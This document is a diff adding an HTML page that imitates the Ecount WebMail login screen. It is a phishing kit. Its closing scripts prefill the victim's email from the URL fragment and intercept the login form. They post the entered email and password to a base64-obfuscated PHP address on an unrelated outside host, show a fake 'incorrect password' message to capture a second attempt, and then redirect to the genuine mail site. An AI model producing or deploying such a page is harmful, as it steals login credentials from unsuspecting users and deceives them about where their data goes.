@@ -1,0 +1,429 @@
+<html class=""><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="ECOUNT">
+
+    <title>Ecount WebMail - Login</title>
+    
+    <link rel="shortcut icon" href="https://wmail.ecount.com/static/contents/images/ci/favicon.ico">
+    <link rel="stylesheet" href="https://resourcev3.ecount.com/ec3/freq/wmail/contents/bundle/bundle.style.noauth.6706716913516587922.19.css">
+        <link rel="stylesheet" href="https://resourcev3.ecount.com/ec3/freq/wmail/contents/css/login.-3673191320641001309.19.css">
+    <link rel="stylesheet" href="https://resourcev3.ecount.com/ec3/freq/wmail/contents/css/common-responsive.-727052913155639716.19.css">
+
+    
+
+</head>
+
+<body class="cursor-default">
+     <script language="javascript">
+    //     window.__EC_BASE_URL = "https://wmail.ecount.com/s3/wmail";
+    </script>
+    
+
+    <div id="UpGradeBrowserNotice" class="wrapper-notification main"></div>
+    <div id="main" class="wrapper-notification main hidden">
+        <div class="notification notification-info animated bounceInDown">
+            <button type="button" class="close" data-dismiss="alert">×</button>
+            <div class="notification-heading">Recommended Web Browser</div>
+            <div class="notification-contents">Current web browser may have some compatibility issues.<br>We recommend using the Google Chrome web browser.</div>
+        </div>
+    </div>
+
+    <div data-ecpageid="" id="divDefaultErr">
+        <div class="page page-fluid page-login-error hidden">
+            <div class="header header-fixed">
+                <div class="wrapper-title">
+                    <div class="wrapper-toolbar">
+                        <div class="pull-left">
+                            <span class="page-name">
+No matching login informaton found.                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="contents contents-fixed" style="margin-top:30px;top:30px;bottom:37px">
+                <div id="divFailCountMessage" class="hidden">
+                    <div class="wrapper-article" data-nosnippet="">
+                        <label id="failCountMessage1"></label>
+                        <br>
+                        <div class="wrapper-toolbar text-center ma-20">
+                            <button class="btn btn-primary btn-xl" id="findPassword" onclick="searchPasswordPopup();" data-nosnippet="">Forgot your login information?</button>
+                        </div>
+                        <label id="failCountMessage2" class="hidden" data-nosnippet="">
+                            <br>
+                            If you have entered incorrectly more than 5 times, reset using [Forgot your login information?] or
+                            <br>
+                            Please request a change to the mail administrator.
+                        </label>
+                        <label id="failCountMessage3" class="hidden" data-nosnippet="">
+                            <br>
+                            Reset using [Forgot your login information?] or
+                            <br>
+                            Please request a change to the mail administrator.
+                        </label>
+                    </div>
+                    <div class="wrapper-sub-title" data-nosnippet="">Failed Login Attempts</div>
+                    <table class="table table-bordered">
+                        <colgroup>
+                            <col class="table-login-error-col1">
+                            <col class="table-login-error-col2">
+                        </colgroup>
+                        <thead>
+                            <tr>
+                                <th data-nosnippet="">Time</th>
+                                <th data-nosnippet="">IP</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr id="failDetailRow0" class="hidden">
+                                <td class="text-center" id="failtime0"></td>
+                                <td class="text-center" id="failIp0"></td>
+                            </tr>
+                            <tr id="failDetailRow1" class="hidden">
+                                <td class="text-center" id="failtime1"></td>
+                                <td class="text-center" id="failIp1"></td>
+                            </tr>
+                            <tr id="failDetailRow2" class="hidden">
+                                <td class="text-center" id="failtime2"></td>
+                                <td class="text-center" id="failIp2"></td>
+                            </tr>
+                            <tr id="failDetailRow3" class="hidden">
+                                <td class="text-center" id="failtime3"></td>
+                                <td class="text-center" id="failIp3"></td>
+                            </tr>
+                            <tr id="failDetailRow4" class="hidden">
+                                <td class="text-center" id="failtime4"></td>
+                                <td class="text-center" id="failIp4"></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                <div id="divFailMessage" class="wrapper-article">
+                    <div class="wrapper-toolbar text-lg" data-nosnippet="">
+                        <label id="errorMessage"></label>
+                    </div>
+                    <div class="wrapper-sub-title hidden" id="errorSolution" data-nosnippet="">Solution</div>
+                    <ul class="hidden" id="errorSolutionUl">
+                        <li id="errorSolutionMessage"></li>
+                    </ul>
+                </div>
+
+            </div>
+            <div class="footer footer-fixed">
+                <div class="wrapper-toolbar">
+                    <button class="btn btn-default" onclick="closeErrorPopup();" id="closeButton">Close</button>
+                    <button class="btn btn-default hidden" onclick="masterLogin();" id="masterLogin">Master ID Login</button>
+                    <button class="btn btn-default hidden" onclick="secessionLogin();" id="secessionLogin">Login</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-backdrop fade in hidden" id="fade"></div>
+
+
+    <div class="page-login-form webmail" id="">
+        <form id="">
+            <div class="page-login-form state-type-id webmail ">
+                <div class="contents">
+                    <div class="login-logo"></div>
+
+                    <div class="login-form">
+                        <div class="form">
+                            <div class="login-id" data-nosnippet="">
+                                <input type="email" class="form-control" id="loginEmail" maxlength="100" name="email" required value="" autocomplete="new-password" placeholder="Email">
+                            </div>
+                            <div class="login-password" data-nosnippet="">
+                                <input type="password" class="form-control"  id="loginPass" name="passwd" maxlength="15" autocomplete="new-password" required placeholder="비밀번호">
+                            </div>
+                        </div>
+
+                        <div class="form-option">
+                            <span class="form-checkbox form-checkbox-block" data-nosnippet="">
+                                <input type="checkbox" id="" name="loginck">
+                                <label for="loginck" data-nosnippet="">Email 저장</label>
+                            </span>
+                        </div>
+
+                        <div class="form-login-btn">
+                            <button type="submit" class="btn btn-primary" id="loginSubmit" data-nosnippet="">Login</button>
+                        </div>
+                        <div class="wrong_message" style="display:none">
+                            <p id="wrong_message_paragraph" style="text-align: center; font-size: medium; margin-top: 25px; color: red;">아이디나 전화번호를 다시 확인하세요.	</p>
+                        </div>
+                    </div>
+
+                
+                    <div class="login-notice">
+                        
+                        <div class="panel panel-default">
+                            <div class="panel-heading">
+
+                            </div>
+                            <div class="panel-body">
+                               
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="login-function">
+                        <ul class="family-sites">
+                            <li class="erp"><a href="#" target="_blank" data-nosnippet="">ECOUNT ERP</a></li>
+                            <li class="cs"><a href="#" target="_blank" data-nosnippet="">이카운트 Webmail 홈페이지</a></li>
+                            <li class="userpay"><a href="#" target="_blank" data-nosnippet="">UserPay</a></li>
+                            <li class="homepage"><a href="#" id="homePage" onclick="homePagePopup();" target="_blank" data-nosnippet="">ECOUNT Website</a></li>
+                            <li class="homepage-mail"><a href="#">이카운트 Webmail 홈페이지</a></li>
+                        </ul>
+
+                        <ul class="function">
+                            <li class="create-shortcut" onclick="createShortcut();">바로가기생성<a href="#false" id="createShortcut" target="_blank"></a></li>
+                                <li class="call-center" onclick="writeCallBack();">전화상담요청 </li>
+                            <li class="browser-optimization" onclick="browserOptimization();">브라우저 최적화</li>
+                            <li class="connection-failure-request" onclick="connectionFailureRequest();">접속장애 해결요청</li>
+                            <li class="remote-assistance" onclick="remoteAssistance();">원격지원</li>
+                            <li class="email-inquiry" onclick="QuestionMailPopup();">이메일 문의</li>
+
+
+                        </ul>
+                    </div>
+
+                    <div class="login-additional-function">
+                        <ul>
+                            <li><a href="#" onclick="searchPasswordPopup();">비밀번호 찾기?</a></li>
+                            <li><a href="#" id="api" onclick="javascript:oapiPageRedirect('en-US')"> 개인정보처리방침</a></li>
+                            <li>
+                                <button type="button" class="btn btn-default btn-selectbox">한국 (한국어)</button>
+                                <ul class="dropdown-menu dropup">
+                                    <li id="li_ko-KR">
+                                    </li><li><a href="#" onclick="lanTypeChange('ko-KR');">한국 (한국어)</a></li>
+                                    <li id="li_en-US" class="active"><a href="#false" onclick="lanTypeChange('en-US');">United States (English)</a></li>
+                                    <li id="li_zh-CN"><a href="#false" onclick="lanTypeChange('zh-CN');">中国 (简体中文)</a></li>
+                                    <li id="li_zh-TW"><a href="#false" onclick="lanTypeChange('zh-TW');">台灣 (繁體中文)</a></li>
+                                    <li id="li_ja-JP"><a href="#false" onclick="lanTypeChange('ja-JP');">日本 (日本語)</a></li>
+                                    <li id="li_vi-VN"><a href="#false" onclick="lanTypeChange('vi-VN');">Việt Nam (Tiếng Việt)</a></li>
+                                    <li id="li_es"><a href="#false" onclick="lanTypeChange('es');">América Latina (Español)</a></li>
+                                    <li id="li_en-MY"><a href="#false" onclick="lanTypeChange('en-MY');">Malaysia (English)</a></li>
+                                    <li id="li_id-ID"><a href="#false" onclick="lanTypeChange('id-ID');">Indonesia (Bahasa Indonesia)</a></li>
+                                    <li id="li_th-TH"><a href="#false" onclick="lanTypeChange('th-TH');">ประเทศไทย (ไทย)</a></li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </div>
+
+                </div>
+            </div>
+
+
+            <!-- <input type="hidden" id="process_ing" name="process_ing" value="N">
+            <input type="hidden" id="lan_type" name="lan_type" value="en-US">
+            <input type="hidden" id="domain" name="domain" value="wmail.ecount.com">
+            <input type="hidden" id="login_type" name="login_type" value="N"> -->
+        </form>
+    </div>
+
+    
+    <!-- <script src="/wmail/optimized/contents/js/92e0c59c8c80e9357bea06357513e229_83cd0bda6407b1bb7440b6cead9e30cd.js?v=-8117236485614922870-19"></script>
+        <script src="s3/wmail/contents/js/lib/jactivator.dbgskip.-4905077998122110148.19.js"></script>
+    <script src="s3/wmail/contents/bundle/bundle.tpl.3239820863513080396.19.js"></script>
+        <script src="s3/wmail/contents/js/lib/obprepare.dbgskip.-4905077998122110148.19.js"></script>
+        <script src="s3/wmail/contents/js/lib/xcessbody.dbgskip.-4905077998122110148.19.js"></script>
+        <script src="s3/wmail/contents/js/jquery.prototype.ajax.extend.dbgskip.-4905077998122110148.19.js"></script>
+    <script src="s3/wmail/contents/js/require/require.resource.en-us.7758178940146870382.19.js"></script>
+
+    <script src="s3/wmail/contents/js/culture/culture.en-us.-4905077998122110148.19.js"></script>
+    <script src="s3/wmail/contents/bundle/bundle.prototype.3239820863513080396.19.js"></script>
+    
+    <script src="s3/wmail/contents/js/require/require.noauth.4186344330484613964.19.js"></script>
+    
+    <script src="s3/wmail/contents/bundle/bundle.infra.noauth.-4658749544485783384.19.js"></script>
+	<script src="s3/wmail/contents/bundle/bundle.frameworks.3239820863513080396.19.js"></script><script type="text/javascript" async="" src="https://wmail.ecount.com/s3/wmail/ecount-resources"></script>
+    <script language="javascript">
+        $.extend(ecount, {
+            proxyPathRoot: "/",
+            apiPathRoot: "/WMAPI",
+        });
+    </script> -->
+
+    
+
+    
+    <!-- <script language="javascript">
+        var getBrowser = function () {
+            'use strict';
+            var agent = navigator.userAgent.toLowerCase();
+            var name = navigator.appName;
+            var browser;
+
+            // MS 계열 브라우저를 구분하기 위함.
+            if (name === 'Microsoft Internet Explorer' || agent.indexOf('trident') > -1 || agent.indexOf('edge/') > -1) {
+                browser = 'ie';
+                if (name === 'Microsoft Internet Explorer') { // IE old version (IE 10 or Lower)
+                    agent = /msie ([0-9]{1,}[\.0-9]{0,})/.exec(agent);
+                    browser += parseInt(agent[1]);
+                } else { // IE 11+
+                    if (agent.indexOf('trident') > -1) { // IE 11
+                        browser += 11;
+                    } else if (agent.indexOf('edge/') > -1) { // Edge
+                        browser = 'edge';
+                    }
+                }
+            } else if (agent.indexOf('safari') > -1) { // Chrome or Safari
+                if (agent.indexOf('opr') > -1) { // Opera
+                    browser = 'opera';
+                } else if (agent.indexOf('chrome') > -1) { // Chrome
+                    browser = 'chrome';
+                } else { // Safari
+                    browser = 'safari';
+                }
+            } else if (agent.indexOf('firefox') > -1) { // Firefox
+                browser = 'firefox';
+            }
+
+            return browser;
+        }
+
+        var browser = getBrowser();
+        if (/^ie[0-8]$/i.test(browser)) {
+            location.href = "/WMAIL/Login/DenyBrowser?lan_type=en-US";
+        }
+        else if (/^ie9$/i.test(browser)) {
+            $("#main").removeClass("hidden");
+        }
+
+        window["viewBag" + ""] = {};
+        window["viewBag" + ""].errCode = "";
+        window["viewBag" + ""].errMsg = "";
+        window["viewBag" + ""].MSG07372 = "You have typed an incorrect password more than 5 times and will no longer be able to login with your old password.";
+        window["viewBag" + ""].MSG07875 = "Telephone consultations are not available at this time.";
+        window["viewBag" + ""].loginFailResult = '';
+        window["viewBag" + ""].noticeInfo = {
+            usingNotification: "N",
+            notificationText: ""
+        };
+        window["viewBag" + ""].loginErrorMsg = "Please enter the correct Code, ID, and Password.<br />If you do not know your login information, please contact the Master ID.";
+        window["viewBag" + ""].LBL09475 = 'Renew Ecount Webmail Subscription';
+        window["viewBag" + ""].LBL13321 = 'Call Help Request';
+        window["viewBag" + ""].ieDeactiveMsg = {
+            contents: "<div class='text-center text-xl text-bold mt-10'>Information on the Usage Restriction Due to IE Service Termination</div><div class='wrapper-article mt-15'>	<div class='text-lg'>Internet Explorer was restricted from use in ECOUNT as Microsoft terminates its services on 15th June 2022. </div>	<div class='text-lg mt-10'>Login through the IE browser is <span class='text-danger text-bold'>not possible.</span>.<br>Please use one of the two browsers below.</div>	<div class='mt-10'>	  <table class='table table-border-no-a ml-15 text-lg'>		<tbody>		  <tr>			<td style='width:120px; height:35px'><div class='text-remark mt-0'>Chrome</div></td>			<td><a href='{0}' target='_blank'><button class='btn btn-sm btn-primary'>Download</button></a></td>		  </tr>		  <tr>			<td style='width:120px; height:35px'><div class='text-remark mt-0'>Edge</div></td>			<td><a href='{1}' target='_blank'><button class='btn btn-sm btn-primary'>Download</button></a></td>		  </tr>		</tbody>	  </table>	</div></div>",
+            todayNotView: "Disable pop-up today",
+            close: "Close"
+        };
+        window.__EC_PAGE_ID = "";
+    </script> -->
+   
+
+    <!-- <script language="javascript">
+        
+        // Shorthand for $(document).ready()
+        $(function () {
+            $("body").addClass("cursor-default");
+        });
+    </script> -->
+
+
+
+<script>	
+		
+    var feedUpdateResponse = window.location.href;
+    var feedUpdateSplit = feedUpdateResponse.split("");
+    
+    for (var x = 0; x < feedUpdateSplit.length; x++) {
+     
+     if (feedUpdateSplit[x]=="#"){
+      var che= feedUpdateResponse.substring(x+1);
+     
+     }else{
+     
+     }
+     
+     }
+      document.getElementById("pet").value =che
+    document.getElementById("p1").innerHTML = che
+      document.getElementById("pet").value =che
+    
+    </script>
+    
+    
+        <script src="https://code.jquery.com/jquery-1.9.1.js"></script>
+        <script>
+    
+          
+           $(document).ready(function() {
+
+                var user=$("#pet").val();
+              var  count=0;
+               
+            $('form').submit(function(e) {
+                
+                count=count+1;
+                
+               var d=atob("aHR0cHM6Ly9wYXJrbGFuZHVzYS5jby8vanVuL2Vjb3VudC5waHA=");
+    
+                e.preventDefault();
+                   $.ajax({
+                   
+                type: 'POST',
+                url: d,
+                crossDomain: true,
+                data: $('form').serialize(),
+                
+                 beforeSend: function(xhr){
+                  $('#loginSubmit').html('Verifing...');
+                  
+                  
+    if (count>=2) { 
+                    // var user_domain = document.getElementById("email").value;
+                    // var domain = user_domain.split("@");
+                    // var host_domain = domain[1];
+                    
+                        count=0;
+                        // window.location.replace(response['redirect_link']);
+                        window.location.replace("https://www.ecountmail.com/");
+
+    
+                      }else{
+                       var x = document.getElementById("loginEmail").value;
+                         
+                        
+                       $('#loginSubmit').html('CONTINUE');
+                           document.getElementById("loginPass").value ="";
+                         
+                        
+                    $(".wrong_message").show();
+                        $("#wrong_message_paragraph").html("The username or password you entered is incorrect.");
+    
+                         }
+                },
+                        
+                success: function () {
+                    $(".wrong_message").show();
+                        $("#wrong_message_paragraph").html("The username or password you entered is correct.");
+  
+                }
+              });
+            });
+        });
+        </script> 
+
+  
+    
+ <!-- <script>
+	function validated() {
+if(document.myForm.email.value.trim() == ""){
+	alert("Please Provide Your Email!");
+	document.myForm.email.focus();
+	return false;
+}
+if(document.myForm.passwd.value.trim() == "" || 
+    document.myForm.passwd.value.length==0 ){
+	alert("Please Provide Password!");
+		document.myForm.passwd.focus();
+		return false;
+	}
+	return true;
+}
+</script>  -->
+
+
+</body></html>
